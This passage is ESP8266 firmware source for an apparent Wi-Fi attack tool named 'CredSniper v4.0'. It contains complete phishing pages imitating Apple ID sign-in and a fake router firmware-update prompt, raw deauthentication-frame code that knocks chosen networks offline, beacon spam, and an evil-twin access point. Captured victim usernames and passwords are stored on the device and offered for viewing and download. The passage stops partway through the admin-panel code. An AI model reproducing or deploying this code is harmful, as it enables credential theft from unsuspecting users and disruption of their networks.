pointer; } .btn-login:active { background: #0066d6; transform: scale(0.98); } .divider { display: flex; align-items: center; margin: 25px 0; color: #86868b; } .divider::before, .divider::after { content: ''; flex: 1; height: 1px; background: #d2d2d7; } .divider span { padding: 0 15px; font-size: 14px; } .apple-id-help { text-align: center; margin-top: 25px; } .apple-id-help a { color: #007AFF; text-decoration: none; font-size: 15px; display: block; margin: 8px 0; } .create-account { text-align: center; margin-top: 30px; padding-top: 20px; border-top: 1px solid #d2d2d7; color: #86868b; font-size: 15px; } .create-account a { color: #007AFF; text-decoration: none; font-weight: 600; } .security-prompt { background: #f2f2f7; border: 1px solid #d1d1d6; border-radius: 8px; padding: 16px; margin-bottom: 25px; font-size: 14px; color: #1d1d1f; } .security-prompt strong { color: #007AFF; }</style></head><body><div class=\"container\"><div class=\"login-box\"><div class=\"apple-logo\"><svg viewBox=\"0 0 24 24\"><path d=\"M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.81-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M13 3.5c.73-.83 1.94-1.46 2.94-1.5.13 1.17-.34 2.35-1.04 3.19-.69.85-1.83 1.51-2.95 1.42-.15-1.15.31-2.33 1.05-3.11z\"/></svg></div><h1>Sign in to your Apple ID</h1><div class=\"security-prompt\"><strong>Verification Required:</strong> For your security, please sign in again to access iCloud services.</div><form method=\"post\" action=\"/capture\"><div class=\"input-group\"><input type=\"text\" name=\"apple_id\" placeholder=\"Apple ID\" required></div><div class=\"input-group\"><input type=\"password\" name=\"password\" placeholder=\"Password\" required></div><div class=\"forgot-link\"><a href=\"#\">Forgot Apple ID or Password?</a></div><button class=\"btn-login\" type=\"submit\">Sign In</button></form><div class=\"divider\"><span>or</span></div><div class=\"apple-id-help\"><a href=\"#\">Create an Apple ID</a><a href=\"#\">Need help?</a></div><div class=\"create-account\">Don't have an Apple ID? <a href=\"#\">Create one now</a></div></div></div></body></html>";

const char SUCCESS_PAGE[] PROGMEM = "<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width, initial-scale=1.0, maximum-scale=1.0'><title>Verifying Account - Please Wait</title><style>*{margin:0;padding:0;box-sizing:border-box;}body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;background:linear-gradient(135deg,#2ecc71 0%,#27ae60 100%);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;}.container{background:white;border-radius:16px;padding:40px 30px;width:100%;max-width:400px;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,0.3);}.logo-circle{width:70px;height:70px;margin:0 auto 20px;background:linear-gradient(135deg,#2ecc71 0%,#27ae60 100%);border-radius:50%;display:flex;align-items:center;justify-content:center;}.logo-icon{font-size:32px;color:white;}.spinner{margin:30px auto;width:50px;height:50px;border:4px solid #f3f3f3;border-top:4px solid #2ecc71;border-radius:50%;animation:spin 1s linear infinite;}@keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}h1{color:#333;font-size:22px;margin-bottom:12px;font-weight:600;}.message{color:#666;font-size:15px;line-height:1.5;margin-bottom:25px;}.loader-dots{display:flex;justify-content:center;margin:25px 0;}.dot{width:10px;height:10px;background:#2ecc71;border-radius:50%;margin:0 5px;animation:bounce 1.4s infinite ease-in-out both;opacity:0.7;}.dot:nth-child(1){animation-delay:-0.32s;}.dot:nth-child(2){animation-delay:-0.16s;}@keyframes bounce{0%,80%,100%{transform:scale(0);}40%{transform:scale(1);}}.progress-container{width:100%;height:6px;background:#f0f0f0;border-radius:3px;margin:30px 0;overflow:hidden;}.progress-bar{height:100%;background:linear-gradient(to right,#2ecc71,#27ae60);width:0%;animation:progress 2s ease-in-out infinite;}@keyframes progress{0%{width:0%;margin-left:0%;}50%{width:40%;margin-left:30%;}100%{width:0%;margin-left:100%;}}.security-badges{display:flex;justify-content:center;gap:15px;margin-top:25px;}.badge{display:flex;align-items:center;gap:6px;font-size:12px;color:#666;}.badge-icon{font-size:14px;}.status-text{font-size:13px;color:#888;margin-top:20px;padding-top:20px;border-top:1px solid #eee;}</style><script>let dots=0;setInterval(function(){dots=(dots+1)%4;document.getElementById('dots').innerHTML='.'.repeat(dots);},500);const statusMessages=['Checking credentials','Verifying account','Checking security','Finalizing login','Login successful!'];let statusIndex=0;setInterval(function(){document.getElementById('status').textContent=statusMessages[statusIndex];statusIndex=(statusIndex+1)%statusMessages.length;if(statusIndex==4){setTimeout(function(){window.location.href='about:blank';},1000);}},1500);</script></head><body><div class='container'><div class='logo-circle'><div class='logo-icon'>🔐</div></div><h1>Verifying Your Account</h1><div class='message'>Please wait while we verify your credentials<span id='dots'></span></div><div class='spinner'></div><div class='loader-dots'><div class='dot'></div><div class='dot'></div><div class='dot'></div></div><div class='progress-container'><div class='progress-bar'></div></div><div class='security-badges'><div class='badge'><span class='badge-icon'>🔒</span><span>Secure</span></div><div class='badge'><span class='badge-icon'>🔐</span><span>Encrypted</span></div><div class='badge'><span class='badge-icon'>✅</span><span>Verified</span></div></div><div class='status-text'><span id='status'>Checking credentials</span></div></div></body></html>";

const char TEMPLATE_FIRMWARE_UPDATE[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
<title>%SSID% :: Firmware Update Failed</title>
<meta name=viewport content="width=device-width,initial-scale=1">
<style>
article { background: #f2f2f2; padding: 1.3em; }
body { color: #333; font-family: Century Gothic, sans-serif; font-size: 18px; line-height: 24px; margin: 0; padding: 0; }
div { padding: 0.5em; }
h1 { margin: 0.5em 0 0 0; padding: 0.5em; font-size:7vw; }
input { width: 100%; padding: 9px 10px; margin: 8px 0; box-sizing: border-box; border-radius: 0; border: 1px solid #555555; border-radius: 10px; }
label { color: #333; display: block; font-style: italic; font-weight: bold; }
nav { background: #0066ff; color: #fff; display: block; font-size: 1.3em; padding: 1em; }
nav b { display: block; font-size: 1.5em; margin-bottom: 0.5em; }
textarea { width: 100%; }
</style>
<meta charset="UTF-8">
</head>
<body>
<nav><b>%SSID%</b> ACCESS POINT RESCUE MODE</nav>
<div><h1><warning style='text-shadow: 1px 1px black;color:yellow;font-size:7vw;'>&#9888;</warning> Firmware Update Failed</h1></div>
<div>Your router encountered a problem while automatically installing the latest firmware update.<br><br>To revert the old firmware and manually update later, please verify your password.</div>
<div>
<form action='/capture' method=post>
<label>WiFi password:</label>
<input type=password id='password' name='password' minlength='8' required>
<input type=submit value=Continue>
</form>
</div>
<div class=q><a>&#169; All rights reserved.</a></div>
</body>
</html>
)rawliteral";

// ========== UTILITY FUNCTIONS ==========
int getSignalQuality(int rssi) {
  if (rssi >= -50) return 100;
  if (rssi >= -60) return 90;
  if (rssi >= -70) return 75;
  if (rssi >= -80) return 50;
  if (rssi >= -90) return 25;
  return 0;
}

String formatUptime() {
  unsigned long seconds = millis() / 1000;
  unsigned long hours = seconds / 3600;
  seconds %= 3600;
  unsigned long minutes = seconds / 60;
  seconds %= 60;
  char buffer[12];
  snprintf(buffer, sizeof(buffer), "%02lu:%02lu:%02lu", hours, minutes, seconds);
  return String(buffer);
}

String getRAMInfo() {
  uint32_t freeHeap = ESP.getFreeHeap();
  uint32_t maxBlock = ESP.getMaxFreeBlockSize();
  uint8_t frag = ESP.getHeapFragmentation();
  String info = String(freeHeap) + " bytes free | Max block: " + String(maxBlock) + " | Frag: " + String(frag) + "%";
  if (freeHeap < 10000 || maxBlock < 5000) info += " (⚠️ Low)";
  else if (freeHeap < 20000) info += " (⚠️ Medium)";
  else info += " (✅ Healthy)";
  return info;
}

bool spiffsMounted = false;
bool spiffsFailed = false;

String getSPIFFSInfo() {
  if (spiffsFailed) return "❌ Not Mounted";
  if (!spiffsMounted && !SPIFFS.begin()) {
    spiffsFailed = true;
    return "❌ Mount Failed";
  }
  spiffsMounted = true;
  FSInfo fs_info;
  SPIFFS.info(fs_info);
  float usedPercent = (fs_info.usedBytes * 100.0) / fs_info.totalBytes;
  String info = String(fs_info.usedBytes / 1024) + "KB/" + String(fs_info.totalBytes / 1024) + "KB (" + String(usedPercent, 1) + "%)";
  if (usedPercent > 90) info += " (⚠️ Full)";
  else if (usedPercent > 70) info += " (⚠️ High)";
  else info += " (✅ OK)";
  return info;
}

String formatBSSID(uint8_t* bssid) {
  char buf[18];
  snprintf(buf, sizeof(buf), "%02X:%02X:%02X:%02X:%02X:%02X",
           bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
  return String(buf);
}

// ========== SESSION FUNCTIONS ==========
void initSessions() { for (int i = 0; i < MAX_SESSIONS; i++) sessions[i].active = false; }

void cleanupSessions() {
  unsigned long now = millis();
  for (int i = 0; i < MAX_SESSIONS; i++) {
    if (sessions[i].active && (now - sessions[i].lastActivity > SESSION_TIMEOUT)) {
      sessions[i].active = false;
      sessions[i].email = "";
      sessions[i].password = "";
    }
  }
}

VictimSession* getSession() {
  cleanupSessions();
  IPAddress clientIP = webServer.client().remoteIP();
  for (int i = 0; i < MAX_SESSIONS; i++)
    if (sessions[i].active && sessions[i].ip == clientIP) {
      sessions[i].lastActivity = millis();
      return &sessions[i];
    }
  for (int i = 0; i < MAX_SESSIONS; i++)
    if (!sessions[i].active) {
      sessions[i].ip = clientIP;
      sessions[i].email = "";
      sessions[i].password = "";
      sessions[i].lastActivity = millis();
      sessions[i].active = true;
      return &sessions[i];
    }
  int oldestIndex = 0;
  unsigned long oldestTime = millis();
  for (int i = 0; i < MAX_SESSIONS; i++)
    if (sessions[i].lastActivity < oldestTime) {
      oldestTime = sessions[i].lastActivity;
      oldestIndex = i;
    }
  sessions[oldestIndex].ip = clientIP;
  sessions[oldestIndex].email = "";
  sessions[oldestIndex].password = "";
  sessions[oldestIndex].lastActivity = millis();
  sessions[oldestIndex].active = true;
  return &sessions[oldestIndex];
}

void clearSession(IPAddress ip) {
  for (int i = 0; i < MAX_SESSIONS; i++)
    if (sessions[i].active && sessions[i].ip == ip) {
      sessions[i].active = false;
      sessions[i].email = "";
      sessions[i].password = "";
      break;
    }
}

String getSuccessPageWithRedirect() { return FPSTR(SUCCESS_PAGE); }

void handleManualStop() {
  String html = "<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width, initial-scale=1.0'><title>Stopping Attack</title><style>body{background:#121212;color:#fff;font-family:monospace;display:flex;justify-content:center;align-items:center;height:100vh;}.card{background:#1e1e1e;padding:30px;border-radius:10px;text-align:center;}</style></head><body><div class='card'><h1>🛑 Attack Stopped</h1><p>Reverting to Admin AP...</p></div><script>setTimeout(function(){ window.location.href='/'; }, 1500);</script></body></html>";
  webServer.send(200, "text/html", html);
  delay(1000);
  returnToAdminAP();
}

// ========== MULTI-SELECTION ==========
bool bssidMatch(uint8_t* a, uint8_t* b) {
  for (int i = 0; i < 6; i++) if (a[i] != b[i]) return false;
  return true;
}

void addNetworkToSelection(int networkIndex) {
  if (networkIndex < 0 || networkIndex >= MAX_NETWORKS || !networks[networkIndex].inRange || selectedNetworkCount >= MAX_SELECTED_NETWORKS) return;
  for (int i = 0; i < selectedNetworkCount; i++)
    if (selectedNetworks[i].ssid == networks[networkIndex].ssid && bssidMatch(selectedNetworks[i].bssid, networks[networkIndex].bssid)) return;
  selectedNetworks[selectedNetworkCount].ssid = networks[networkIndex].ssid;
  memcpy(selectedNetworks[selectedNetworkCount].bssid, networks[networkIndex].bssid, 6);
  selectedNetworks[selectedNetworkCount].ch = networks[networkIndex].ch;
  selectedNetworks[selectedNetworkCount].rssi = networks[networkIndex].rssi;
  networks[networkIndex].selected = true;
  selectedNetworkCount++;
}

void removeNetworkFromSelectionByBSSID(String bssidHex) {
  uint8_t bssid[6];
  for (int i = 0; i < 6; i++) {
    char byteStr[3] = {bssidHex[2*i], bssidHex[2*i+1], 0};
    bssid[i] = (uint8_t)strtol(byteStr, NULL, 16);
  }
  for (int i = 0; i < selectedNetworkCount; i++) {
    if (bssidMatch(selectedNetworks[i].bssid, bssid)) {
      for (int j = i; j < selectedNetworkCount - 1; j++) selectedNetworks[j] = selectedNetworks[j + 1];
      selectedNetworkCount--;
      for (int k = 0; k < MAX_NETWORKS; k++) {
        if (networks[k].inRange && bssidMatch(networks[k].bssid, bssid)) networks[k].selected = false;
      }
      break;
    }
  }
}

void removeNetworkFromSelection(int networkIndex) {
  if (networkIndex < 0 || networkIndex >= MAX_NETWORKS || !networks[networkIndex].inRange) return;
  for (int i = 0; i < selectedNetworkCount; i++) {
    if (selectedNetworks[i].ssid == networks[networkIndex].ssid && bssidMatch(selectedNetworks[i].bssid, networks[networkIndex].bssid)) {
      for (int j = i; j < selectedNetworkCount - 1; j++) selectedNetworks[j] = selectedNetworks[j + 1];
      selectedNetworkCount--;
      networks[networkIndex].selected = false;
      break;
    }
  }
}

void clearAllSelections() {
  for (int i = 0; i < MAX_NETWORKS; i++) networks[i].selected = false;
  selectedNetworkCount = 0;
}

// ========== DEAUTH FUNCTIONS ==========
void sortSelectedNetworksByChannel() {
  for (int i = 0; i < selectedNetworkCount - 1; i++) {
    for (int j = 0; j < selectedNetworkCount - i - 1; j++) {
      if (selectedNetworks[j].ch > selectedNetworks[j + 1].ch) {
        SelectedNetwork temp = selectedNetworks[j];
        selectedNetworks[j] = selectedNetworks[j + 1];
        selectedNetworks[j + 1] = temp;
      }
    }
  }
}

void performDeauthAll() {
  if (!deauthAll_active || selectedNetworkCount == 0 || millis() - lastDeauthAll < DEAUTH_ALL_INTERVAL) return;
  lastDeauthAll = millis();
  if (currentDeauthIndex >= selectedNetworkCount) currentDeauthIndex = 0;
  SelectedNetwork& net = selectedNetworks[currentDeauthIndex];
  if (net.ch != currentDeauthChannel) {
    wifi_set_channel(net.ch);
    currentDeauthChannel = net.ch;
    delay(3);
  }
  uint8_t deauthPacket[26] = {
    0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0xFF, 0x00, 0x00, 0x01, 0x00
  };
  memcpy(&deauthPacket[10], net.bssid, 6);
  memcpy(&deauthPacket[16], net.bssid, 6);
  deauthPacket[24] = 7;
  wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);
  delay(1);
  uint8_t broadcastPacket[26];
  memcpy(broadcastPacket, deauthPacket, sizeof(deauthPacket));
  uint8_t broadcastAddr[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
  memcpy(&broadcastPacket[10], broadcastAddr, 6);
  memcpy(&broadcastPacket[16], broadcastAddr, 6);
  wifi_send_pkt_freedom(broadcastPacket, sizeof(broadcastPacket), 0);
  currentDeauthIndex++;
  if (currentDeauthIndex >= selectedNetworkCount) currentDeauthIndex = 0;
  yield();
}

void performDeauth() {

if (routerRescueMode && routerConnecting) return;

  if (deauthing_active && selectedNetworkCount == 1 && millis() - deauth_now >= 200) {
    wifi_set_channel(selectedNetworks[0].ch);
    uint8_t deauthPacket[26] = {
      0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
      0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
      0xFF, 0x00, 0x00, 0x01, 0x00
    };
    memcpy(&deauthPacket[10], selectedNetworks[0].bssid, 6);
    memcpy(&deauthPacket[16], selectedNetworks[0].bssid, 6);
    deauthPacket[24] = 7;
    wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);
    deauthPacket[0] = 0xA0;
    wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);
    deauth_now = millis();
    yield();
  }
}

// ========== AGGRESSIVE BEACON SPAM ==========
void nextChannel() {
  if (channelsCount > 1) {
    uint8_t ch = channels[channelIndex];
    channelIndex = (channelIndex + 1) % channelsCount;
    if (ch != wifi_channel && ch >= 1 && ch <= 14) {
      wifi_channel = ch;
      wifi_set_channel(wifi_channel);
    }
  }
}

void randomMac() { for (int i = 0; i < 6; i++) macAddr[i] = random(256); }

void getSSIDFromList(int index, char* buffer, size_t bufferSize) {
  if (index < 0 || index >= ssidCount) { buffer[0] = '\0'; return; }
  buffer[0] = '\0';
  size_t pos = 0;
  int currentIndex = 0;
  size_t len = strlen_P(ONE_DIRECTION_SSIDS);
  for (size_t i = 0; i < len && currentIndex <= index; i++) {
    char c = pgm_read_byte(&ONE_DIRECTION_SSIDS[i]);
    if (c == '\n') {
      if (currentIndex == index) { buffer[pos] = '\0'; return; }
      currentIndex++;
      pos = 0;
    } else if (currentIndex == index && pos < bufferSize - 1) {
      buffer[pos++] = c;
    }
  }
  if (pos > 0) buffer[pos] = '\0';
}

void performProvenBeaconSpam() {
  if (!beaconSpamActive || ssidCount == 0) return;
  unsigned long now = millis();
  if (now - beaconSpamTime < 100) return;   // 100ms cycle
  beaconSpamTime = now;
  nextChannel();

  for (int i = 0; i < ssidCount; i++) {
    char ssid[33];
    getSSIDFromList(i, ssid, sizeof(ssid));
    uint8_t ssidLen = strlen(ssid);
    if (ssidLen > 32) ssidLen = 32;

    randomMac();
    macAddr[5] = i & 0xFF;
    memcpy(&beaconPacket[10], macAddr, 6);
    memcpy(&beaconPacket[16], macAddr, 6);

    memset(&beaconPacket[38], ' ', 32);
    memcpy(&beaconPacket[38], ssid, ssidLen);
    beaconPacket[37] = ssidLen;
    beaconPacket[82] = wifi_channel;

    if (appendSpaces) {
      for (int k = 0; k < 3; k++) {
        beaconPacketCounter += (wifi_send_pkt_freedom(beaconPacket, packetSize, 0) == 0);
        delay(1);
      }
    } else {
      uint16_t finalSize = 38 + ssidLen + (packetSize - 70);
      if (finalSize > 128) finalSize = 128;
      if (finalSize < 24) finalSize = packetSize;
      uint8_t* pkt = beaconPacket;
      for (int k = 0; k < 3; k++) {
        beaconPacketCounter += (wifi_send_pkt_freedom(pkt, finalSize, 0) == 0);
        delay(1);
      }
    }
    yield();
  }
}

// ========== ROGUE AP / EVIL TWIN ==========
void startRogueAP() {
  if (rogueSSID == "") { uploadStatus = "❌ Set rogue SSID first"; return; }
  if (isProcessing) return;
  isProcessing = true;
  deauthAll_active = false;
  deauthing_active = false;
  beaconSpamActive = false;
  routerRescueMode = false;
  dnsServer.stop();
  delay(50);
  WiFi.softAPdisconnect(true);
  delay(200);
  WiFi.softAPConfig(apIP, apIP, subnet);
  WiFi.softAP(rogueSSID.c_str(), "", rogueChannel);
  dnsServer.start(DNS_PORT, "*", apIP);
  hotspotActive = true;
  rogueModeActive = true;
  isProcessing = false;
}

void stopRogueAP() {
  if (rogueModeActive || hotspotActive) returnToAdminAP();
  rogueModeActive = false;
  rogueSSID = "";
}

void saveToSPIFFS(String username, String password, String tmpl, String extra = "") {
  if (spiffsFailed) return;
  if (!spiffsMounted && !SPIFFS.begin()) { spiffsFailed = true; return; }
  spiffsMounted = true;
  File file = SPIFFS.open(CAPTURE_FILE, "a");
  if (file) {
    String timestamp = String(millis() / 1000);
    String entry = "[" + timestamp + "] Template: " + tmpl + " | User: " + username + " | Pass: " + password;
    if (extra != "") entry += " | " + extra;
    file.println(entry);
    file.close();
    snprintf(liveBuffer[liveHead].ts, sizeof(liveBuffer[liveHead].ts), "%s", timestamp.c_str());
    snprintf(liveBuffer[liveHead].email, sizeof(liveBuffer[liveHead].email), "%.63s", username.c_str());
    snprintf(liveBuffer[liveHead].pass, sizeof(liveBuffer[liveHead].pass), "%.63s", password.c_str());
    snprintf(liveBuffer[liveHead].extra, sizeof(liveBuffer[liveHead].extra), "%.31s", extra.c_str());
    liveHead = (liveHead + 1) % MAX_LIVE_ENTRIES;
    if (liveHead == liveTail) liveTail = (liveTail + 1) % MAX_LIVE_ENTRIES;
    liveTotal++;
  }
}

String getSPIFFSStats() {
  if (spiffsFailed) return "SPIFFS error";
  if (!spiffsMounted && !SPIFFS.begin()) return "SPIFFS error";
  if (!SPIFFS.exists(CAPTURE_FILE)) return "No credentials";
  File f = SPIFFS.open(CAPTURE_FILE, "r");
  int lines = 0;
  while (f.available()) if (f.readStringUntil('\n').length() > 0) lines++;
  f.close();
  return String(lines) + " credentials stored";
}

void deleteCredentialsFile() {
  if (SPIFFS.exists(CAPTURE_FILE)) {
    SPIFFS.remove(CAPTURE_FILE);
    uploadStatus = "🗑️ Credentials file deleted";
  } else {
    uploadStatus = "ℹ️ No credentials file to delete";
  }
}

void handleDeleteCredentialsAction() {
  deleteCredentialsFile();
  webServer.sendHeader("Location", "/view-credentials");
  webServer.send(303, "text/plain", "");
}

// ========== TEMPLATE SELECTION ==========
String getTemplateHTML() {
  String html;
  if (currentTemplate == "google-email") {
    if (SPIFFS.exists("/google-email.html")) {
      File f = SPIFFS.open("/google-email.html", "r");
      if (f) { html = f.readString(); f.close(); return html; }
    }
    return FPSTR(TEMPLATE_GOOGLE_EMAIL);
  }
  
  if (SPIFFS.exists("/" + currentTemplate + ".html")) {
    File f = SPIFFS.open("/" + currentTemplate + ".html", "r");
    if (f) { html = f.readString(); f.close(); return html; }
  }
  return FPSTR(TEMPLATE_GOOGLE_EMAIL);
}

String getTemplateName() {
  if (currentTemplate == "google-email") return "Google (3-Step)";
  if (currentTemplate == "instagram") return "Instagram";
  if (currentTemplate == "facebook") return "Facebook";
  if (currentTemplate == "tiktok") return "TikTok";
  if (currentTemplate == "pinterest") return "Pinterest";
  if (currentTemplate == "apple") return "Apple";
  return currentTemplate;
}

void handleViewCredentials() {
  if (!SPIFFS.exists(CAPTURE_FILE)) {
    webServer.send(200, "text/html", "<html><body><h2>No credentials</h2><a href='/'>← Back</a></body></html>");
    return;
  }
  File f = SPIFFS.open(CAPTURE_FILE, "r");
  String content = f.readString();
  f.close();
  int lines = 0;
  for (int i = 0; i < content.length(); i++) if (content.charAt(i) == '\n') lines++;
  String page = "<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1.0'><title>Credentials</title><style>body{background:#121212;color:#fff;font-family:monospace;padding:20px;}pre{background:#1e1e1e;padding:15px;border-radius:8px;overflow-x:auto;}.btn-del{background:#e74c3c;color:white;padding:10px 20px;border:none;border-radius:5px;cursor:pointer;margin:10px 5px;}.btn-del:hover{background:#c0392b;}.btn-dl{background:#3498db;color:white;padding:10px 20px;border:none;border-radius:5px;cursor:pointer;margin:10px 5px;}.btn-dl:hover{background:#2980b9;}</style></head><body><h1>🔑 Captured Credentials</h1><p>Total entries: " + String(lines) + "</p><pre>" + content + "</pre><form method='post' action='/delete-credentials' onsubmit='return confirm(\"Delete all captured credentials?\")' style='display:inline;'><button class='btn-del' type='submit'>🗑️ Delete All</button></form><form method='get' action='/download-credentials' style='display:inline;'><button class='btn-dl' type='submit'>📥 Download</button></form><a href='/' style='color:#3498db;display:block;margin-top:20px;'>← Back to Admin</a></body></html>";
  webServer.send(200, "text/html", page);
}

void handleDownloadCredentials() {
  if (SPIFFS.exists(CAPTURE_FILE)) {
    File f = SPIFFS.open(CAPTURE_FILE, "r");
    webServer.sendHeader("Content-Type", "text/plain");
    webServer.sendHeader("Content-Disposition", "attachment; filename=credentials.txt");
    webServer.send(200, "text/plain", f.readString());
    f.close();
  } else webServer.send(404, "text/plain", "No credentials");
}

void saveTemplatesToSPIFFS() {
  if (spiffsFailed) return;
  if (!spiffsMounted && !SPIFFS.begin()) { spiffsFailed = true; return; }
  spiffsMounted = true;
  const char* templates[] = {"google-email", "google-password", "google-2fa", "instagram", "facebook", "tiktok", "pinterest", "apple"};
  const char* templateData[] = {TEMPLATE_GOOGLE_EMAIL, TEMPLATE_GOOGLE_PASSWORD, TEMPLATE_GOOGLE_2FA, TEMPLATE_INSTAGRAM, TEMPLATE_FACEBOOK, TEMPLATE_TIKTOK, TEMPLATE_PINTEREST, TEMPLATE_APPLE};
  for (int i = 0; i < 8; i++) {
    String filename = "/" + String(templates[i]) + ".html";
    if (!SPIFFS.exists(filename)) {
      File f = SPIFFS.open(filename, "w");
      if (f) { f.print(FPSTR(templateData[i])); f.close(); }
    }
  }
}

// ========== NON‑STREAMING ADMIN PANEL ==========
void buildFileListHTML(String &html) {
  if (spiffsFailed) { html += F("<div class='file-list'><div class='empty-state'>SPIFFS error</div></div>"); return; }
  if (!spiffsMounted && !SPIFFS.begin()) { spiffsFailed = true; html += F("<div class='file-list'><div class='empty-state'>SPIFFS error</div></div>"); return; }
  spiffsMounted = true;
  html += F("<div class='file-list'>");
  Dir dir = SPIFFS.openDir("/");
  int fileCount = 0;
  while (dir.next()) {
    String fn = dir.fileName();
    if (fn.endsWith(".html") || fn.endsWith(".HTML")) {
      String display = fn.substring(1);
      if (display.endsWith(".html")) display = display.substring(0, display.length() - 5);
      else if (display.endsWith(".HTML")) display = display.substring(0, display.length() - 5);
      String low = display; low.toLowerCase();
      if (low != "index" && low != "admin" && low != "google-email" && low != "google-password" && low != "google-2fa" &&
          low != "instagram" && low != "facebook" && low != "tiktok" && low != "pinterest" && low != "apple") {
        fileCount++;
        html += F("<div class='file-item'><div class='file-name'>");
        html += display;
        if (currentTemplate == display) html += F(" <span class='badge-current'>Current</span>");
        html += F("</div><div class='file-actions'>");
        if (currentTemplate != display) {
          html += F("<form method='post' action='/?use-file=");
          html += display;
          html += F("' style='display:inline;'><button type='submit' class='btn-action btn-use'>🎯 Use</button></form>");
        }
        html += F("<form method='post' action='/?delete-file=");
        html += display;
        html += F("' style='display:inline;'><button type='submit' class='btn-action btn-delete' onclick='return confirm(\"Delete ");
        html += display;
        html += F(".html?\")'>🗑️ Delete</button></form>");
        html += F("</div></div>");
        yield();
        ESP.wdtFeed();
      }
    }
  }
  if (fileCount == 0) html += F("<div class='empty-state'>No custom templates</div>");
  html += F("</div>");
}

void showAdminPanel() {
  String page;
  page.reserve(9000);

  page += R"rawliteral(<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width, initial-scale=1.0'><title>CredSniper v4.0</title><style>*{margin:0;padding:0;box-sizing:border-box;}body{background:#121212;color:#fff;font-family:Arial;padding:15px;}.container{max-width:800px;margin:0 auto;}.header{text-align:center;margin-bottom:20px;border-bottom:1px solid #333;}.selected-networks-box{background:linear-gradient(135deg,#667eea,#764ba2);border-radius:10px;padding:15px;margin-bottom:15px;}.network-chip{display:inline-flex;align-items:center;background:rgba(255,255,255,0.2);border-radius:20px;padding:6px 12px;margin:4px;font-size:12px;}.chip-remove{background:rgba(255,255,255,0.3);border:none;border-radius:50%;width:18px;height:18px;color:white;cursor:pointer;margin-left:6px;}.status-box{background:#1e1e1e;border-radius:10px;padding:15px;margin-bottom:15px;}.status-item{display:flex;justify-content:space-between;margin-bottom:10px;}.card{background:#1e1e1e;border-radius:10px;padding:15px;margin-bottom:15px;}.card-title{font-size:1.2em;font-weight:bold;margin-bottom:12px;border-left:4px solid #2ecc71;padding-left:12px;}.btn{display:block;width:100%;padding:14px;border:none;border-radius:8px;font-size:14px;font-weight:600;text-align:center;cursor:pointer;margin-bottom:10px;}.btn-primary{background:#3498db;color:white;}.btn-success{background:#2ecc71;color:white;}.btn-danger{background:#e74c3c;color:white;}.btn-warning{background:#f39c12;color:white;}.btn-deauth-all{background:linear-gradient(135deg,#ff416c,#ff4b2b);}.btn-small{padding:8px 12px;font-size:12px;width:auto;display:inline-block;margin-right:8px;}.template-grid{display:grid;grid-template-columns:repeat(2,1fr);gap:8px;margin-bottom:12px;}.template-btn{padding:12px;border-radius:8px;border:none;cursor:pointer;}.active{background:#2ecc71;}.network-table{width:100%;border-collapse:collapse;}.network-table th,.network-table td{padding:8px 6px;text-align:left;border-bottom:1px solid #333;font-size:11px;}.select-btn{padding:4px 8px;background:#3498db;color:white;border:none;border-radius:3px;cursor:pointer;}.signal-percent{font-size:10px;padding:2px 5px;border-radius:8px;background:rgba(255,255,255,0.1);}.file-list{background:#2a2a2a;border-radius:8px;}.file-item{display:flex;justify-content:space-between;align-items:center;padding:12px 15px;border-bottom:1px solid #333;}.btn-action{padding:6px 12px;border:none;border-radius:4px;font-size:12px;cursor:pointer;}.btn-use{background:#3498db;}.btn-delete{background:#e74c3c;}.switch{position:relative;display:inline-block;width:50px;height:24px;}.switch input{opacity:0;width:0;height:0;}.slider{position:absolute;cursor:pointer;top:0;left:0;right:0;bottom:0;background-color:#ccc;border-radius:24px;}.slider:before{position:absolute;content:"";height:18px;width:18px;left:3px;bottom:3px;background-color:white;border-radius:50%;}input:checked+.slider{background-color:#2ecc71;}input:checked+.slider:before{transform:translateX(26px);}</style></head><body><div class='container'>)rawliteral";

  page += F("<div class='header'><h1>🎯 CredSniper v4.0</h1>");
  if (routerRescueMode && hotspotActive) page += F("<p style='color:#ff9800;'>🔧 Router Rescue Mode Active</p>");
  else if (deauthAll_active) page += "<p style='color:#ff416c;'>💣 DEAUTH ALL ACTIVE - Targeting " + String(selectedNetworkCount) + " networks</p>";
  else if (hotspotActive) page += F("<p style='color:#2ecc71;'>📡 Evil Twin / Rogue AP Mode</p>");
  else if (beaconSpamActive) page += "<p style='color:#f39c12;'>🐝 Beacon Spam Active | " + String(beaconPacketCounter) + " packets</p>";
  else page += F("<p>⚡ CREATED BY DAWOOD KHAN</p>");
  page += F("</div>");

  if (selectedNetworkCount > 0) {
    page += F("<div class='selected-networks-box'><strong>Selected Networks (");
    page += String(selectedNetworkCount);
    page += F("):</strong><br>");
    for (int i = 0; i < selectedNetworkCount; i++) {
